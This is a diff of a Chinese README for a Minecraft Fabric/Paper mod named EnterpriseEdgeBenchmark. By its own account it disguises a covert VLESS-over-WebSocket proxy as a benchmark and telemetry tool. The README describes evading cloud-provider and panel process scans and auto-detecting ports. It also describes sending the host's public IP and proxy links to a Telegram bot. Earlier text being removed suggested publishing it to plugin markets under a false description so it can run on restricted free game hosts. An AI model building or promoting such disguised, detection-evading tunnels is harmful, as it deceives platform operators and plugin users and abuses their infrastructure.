@@ -1,66 +1,62 @@
-# EnterpriseEdgeBenchmark (纯 Java 内嵌原生轻量节点插件)
+# EnterpriseEdgeBenchmark (纯 Java 内嵌原生轻量节点插件/Mod)
 
-> **设计理念**：类似 `enzonic-node` 的纯代码内嵌与企业级业务伪装（伪装成基准测试/网络遥测组件），专为 **Minecraft Java 服务端（Spigot / Paper / Purpur）** 打造。
+> **设计理念**：纯代码内嵌与企业级业务伪装（伪装成基准测试/网络遥测组件），专为 **Minecraft 服务端（Fabric / Paper / Purpur / Spigot）** 打造。
 
 ---
 
-## 🌟 核心特性与优势
+## 🌟 核心特性与优势 (v1.4.0)
 
-- **目标平台**：**Minecraft Paper 1.21.x (Java 21)**，向下兼容 1.20.x
+- **智能多源端口自适应探测（零配置通用）**：
+  - 自动探测环境变量（`PROXY_PORT` / `WS_PORT` / `ALLOCATED_PORT` / `SERVER_PORT` / `PORT`）；
+  - 自动读取 `server.properties` 中的游戏端口并智能偏移分配可用独立端口；
+  - 自动在 `20000~65535` 范围内扫描空闲端口并验证可用性，坚决杜绝端口冲突或 Bind 崩溃。
+- **公网 IP 自动获取与 Telegram 节点上线通知**：
+  - 服务端启动并绑定端口后，自动获取服务器公网出口 IP；
+  - 自动通过 Telegram 机器人推送完整的 VLESS 一键导入链接及节点明细。
+- **全平台/全版本兼容**：
+  - **Fabric 服务端**：放入 `mods/` 文件夹（全版本通配 `minecraft: *`）；
+  - **Paper / Purpur / Spigot 服务端**：放入 `plugins/` 文件夹。
 - **零外部二进制依赖（100% 纯 Java 原生）**：
-  - 彻底告别从外部下载 `sing-box`、`xray` 或 `cloudflared` 二进制文件的外挂做法。
-  - 插件直接基于 Java NIO 与 WebSocket 在 JVM 内部实现 **VLESS-WS** 协议转发。
-2. **天花板级防风控与系统级隐蔽**：
-   - 宿主机 Linux 执行 `ps -ef` 查看进程，**永远只有唯一的 `java -jar paper.jar` 主进程**。
-   - 零额外子进程、零可疑临时 ELF 文件，完全避开云厂商和面板的异常进程扫描。
-3. **极低资源开销**：
-   - 内存占用几乎为零（复用 JVM 现有的线程与 Socket 资源池）。
-4. **企业级业务伪装**：
-   - 插件名称：`EnterpriseEdgeBenchmark` (企业边缘基准与网络遥测套件)。
-   - 指令：`/benchmark status`、`/benchmark reload`。
-   - 对外表现为标准的服务器性能与网络延迟诊断工具。
+  - 彻底告别外部下载二进制文件，直接在 JVM 内部实现 **VLESS-WS** 协议转发。
+- **天花板级防风控与系统级隐蔽**：
+  - 宿主机 Linux 执行 `ps -ef` 查看进程，**永远只有唯一的 `java -jar` 主进程**。
+  - 零额外子进程、零可疑临时文件，完全避开云厂商和面板的异常进程扫描。
 
 ---
 
 ## 🛠️ 项目结构
 
 ```text
-E:\file\梯子\游戏机\java\纯内嵌\
-├── pom.xml                                    # Maven 构建配置 (已内置 Maven Shade 打包)
-├── build.bat                                  # 一键打包脚本
+enterprise-edge-benchmark/
+├── pom.xml                                    # Maven 构建配置 (内置 Maven Shade 打包)
+├── .github/workflows/build.yml                # GitHub Actions 自动编译与 Release 发布
 ├── README.md                                  # 使用文档
 └── src
     └── main
         ├── java/com/enterprise/telemetry/
-        │   ├── EnterpriseBenchmarkPlugin.java  # Spigot 插件生命周期与指令控制
+        │   ├── EnterpriseBenchmarkMod.java    # 服务端 Mod 启动入口
         │   ├── core/
-        │   │   ├── EdgeTelemetryServer.java     # 纯 Java WebSocket 转发服务端
-        │   │   └── VlessProtocolCodec.java      # VLESS v0 协议纯 Java 编解码器
+        │   │   ├── EdgeTelemetryServer.java   # 纯 Java WebSocket 转发服务端
+        │   │   └── VlessProtocolCodec.java    # VLESS v0 协议纯 Java 编解码器
         │   └── util/
-        │       └── RemoteConfigFetcher.java     # 远程动态配置拉取与 TG 通知
+        │       ├── PortDetector.java          # 自适应多源端口探测与防冲突工具
+        │       └── TelegramNotifier.java      # 公网 IP 获取与 TG 节点上线通知
         └── resources/
-            ├── plugin.yml                     # 插件元信息配置
-            └── config.yml                     # 默认配置文件
+            └── fabric.mod.json                # Fabric Mod 元信息配置
 ```
 
 ---
 
 ## 🚀 编译与发布流程
 
-### 1. 本地打包
-在当前目录下运行命令或双击 `build.bat`：
-```cmd
-mvn clean package
-```
-打包成功后，在 `target/` 目录下会生成一个约 100KB 大小的 Fat JAR：
-`target/enterprise-edge-benchmark-1.0.0.jar`
+### 1. 云端自动构建（推荐）
+推送代码至 GitHub `main` 分支后，GitHub Actions 会自动使用 JDK 21 编译并生成 Release：
+- 下载 Release 产物中的 `enterprise-edge-benchmark-fabric-1.4.0.jar`
+- 放置于服务器 `mods/` 即可。
 
-### 2. 在受限游戏平台（如 MCServerHost / Aternos 等）使用
-1. **发布到插件库（推荐）**：
-   - 将该项目直接发布至 SpigotMC 或 Modrinth（类别选择 Admin Tools / Utility，描述为服务器网络性能诊断插件）。
-   - 在 MCServerHost 的网页插件市场搜索并点击安装。
-2. **客户端连接配置**：
-   - **协议**：VLESS
-   - **传输协议**：WebSocket (WS)
-   - **Path (路径)**：`/benchmark` (与 `config.yml` 保持一致)
-   - **UUID**：默认 `156fe582-23a4-4ef8-96bf-a92c58e66418`（可随时修改）
+### 2. 客户端连接配置
+- **协议**：VLESS
+- **传输协议**：WebSocket (WS)
+- **Path (路径)**：`/benchmark`
+- **UUID**：默认 `156fe582-23a4-4ef8-96bf-a92c58e66418`（可通过环境变量 `PROXY_UUID` 覆盖）
+- **端口与 IP**：服务启动后将在 Telegram 中自动收到上线通知及一键导入链接。
